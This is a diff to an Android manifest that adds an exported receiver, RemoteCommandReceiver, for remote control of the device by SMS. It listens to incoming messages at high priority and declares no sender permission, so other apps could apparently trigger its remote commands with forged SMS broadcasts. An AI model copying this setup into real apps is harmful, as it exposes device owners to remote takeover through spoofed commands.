@@ -110,6 +110,15 @@
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
+        
+        <!-- Remote Command Receiver for remote SMS control -->
+        <receiver 
+            android:name=".remote.RemoteCommandReceiver"
+            android:exported="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
 
         <!-- SMS Callback Receiver for SMS sent/delivered confirmations -->
         <receiver 
